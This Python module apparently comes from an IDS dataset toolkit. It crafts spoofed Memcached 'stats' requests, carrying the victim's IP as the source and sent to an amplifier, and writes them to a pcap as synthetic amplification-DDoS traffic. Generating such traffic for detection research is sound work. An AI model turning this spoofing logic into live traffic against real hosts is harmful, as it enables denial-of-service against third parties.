import logging
import random as rnd
import typing

import scapy.layers.inet as inet

import Attack.BaseAttack as BaseAttack
import Attack.ParameterTypes as Types
import ID2TLib.Utility as Util
import ID2TLib.Memcached as Memcd

from Attack.Parameter import Parameter

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


class MemcrashedSpooferAttack(BaseAttack.BaseAttack):
    IP_SOURCE = 'ip.src'
    MAC_SOURCE = 'mac.src'
    IP_DESTINATION = 'ip.dst'
    MAC_DESTINATION = 'mac.dst'
    IP_VICTIM = 'ip.victim'
    INJECT_AT_TIMESTAMP = 'inject.at-timestamp'
    INJECT_AFTER_PACKET = 'inject.after-pkt'
    PACKETS_PER_SECOND = 'packets.per-second'
    ATTACK_DURATION = 'attack.duration'

    def __init__(self):
        """
        Creates a new instance of the "Memcrashed" Memcached amplification attack.
        """
        # Initialize attack
        super(MemcrashedSpooferAttack, self).__init__("Memcrashed Attack (Spoofer side)",
                                               "Injects the spoofer-side of a Memcached amplification attack",
                                               "Resource Exhaustion")

        # Define allowed parameters and their type
        self.update_params([
            Parameter(self.IP_SOURCE, Types.IPAddress()),
            Parameter(self.MAC_SOURCE, Types.MACAddress()),
            Parameter(self.IP_DESTINATION, Types.IPAddress()),
            Parameter(self.MAC_DESTINATION, Types.MACAddress()),
            Parameter(self.PACKETS_PER_SECOND, Types.Float()),
            Parameter(self.ATTACK_DURATION, Types.IntegerPositive()),
            Parameter(self.IP_VICTIM, Types.IPAddress()),
            Parameter(self.ATTACK_DURATION, Types.IntegerPositive())
        ])

    def init_param(self, param: str) -> bool:
        """
        Initialize a parameter with its default values specified in this attack.

        :param param: parameter, which should be initialized
        :return: True if initialization was successful, False if not
        """
        value = None
        # By default, the most used IP is the attacker
        if param == self.IP_SOURCE:
            value = self.statistics.get_most_used_ip_address()
        elif param == self.MAC_SOURCE:
            ip_src = self.get_param_value(self.IP_SOURCE)
            if ip_src is None:
                return False
            value = self.get_mac_address(ip_src)
        # Target (i.e. amplifier) is a random public IP
        elif param == self.IP_DESTINATION:
            value = self.generate_random_ipv4_address('A')
        elif param == self.MAC_DESTINATION:
            value = self.generate_random_mac_address()
        # IP of the victim which is supposed to get hit by the amplified attack
        elif param == self.IP_VICTIM:
            value = self.generate_random_ipv4_address('A')
        elif param == self.PACKETS_PER_SECOND:
            value = self.statistics.get_most_used_pps()
        elif param == self.ATTACK_DURATION:
            value = rnd.randint(5, 30)
        elif param == self.INJECT_AFTER_PACKET:
            value = rnd.randint(0, self.statistics.get_packet_count())
        if value is None:
            return False
        return self.add_param_value(param, value)

    def generate_attack_packets(self) -> None:
        ip_attacker = self.get_param_value(self.IP_SOURCE)
        mac_attacker = self.get_param_value(self.MAC_SOURCE)
        ip_amplifier = self.get_param_value(self.IP_DESTINATION)
        mac_amplifier = self.get_param_value(self.MAC_DESTINATION)
        ip_victim = self.get_param_value(self.IP_VICTIM)

        timestamp_next_pkt = self.get_param_value(self.INJECT_AT_TIMESTAMP)
        self.attack_start_utime = timestamp_next_pkt

        attack_duration = self.get_param_value(self.ATTACK_DURATION)
        attack_ends_time = timestamp_next_pkt + attack_duration

        _, src_ttl, _ = self.get_ip_data(ip_attacker)
        sport = Util.generate_source_port_from_platform('linux')

        # Use MAC of the actual source, but the IP of the victim
        attacker_ether = inet.Ether(src=mac_attacker, dst=mac_amplifier)
        attacker_ip = inet.IP(src=ip_victim, dst=ip_amplifier, ttl=src_ttl, flags='DF')

        while timestamp_next_pkt <= attack_ends_time:
            request_udp = inet.UDP(sport=sport, dport=Memcd.memcached_port)
            request_memcd = Memcd.Memcached_Request(Request=b'stats\r\n', RequestID=inet.RandShort())
            request = (attacker_ether / attacker_ip / request_udp / request_memcd)
            request.time = timestamp_next_pkt

            self.add_packet(request, ip_victim, ip_amplifier)

            timestamp_next_pkt = self.timestamp_controller.next_timestamp()

    def generate_attack_pcap(self) -> typing.Tuple[int, str]:
        # store end time of attack
        self.attack_end_utime = self.packets[-1].time

        # write attack packets to pcap
        pcap_path = self.write_attack_pcap(self.packets)

        # return packet count and path
        return len(self.packets), pcap_path
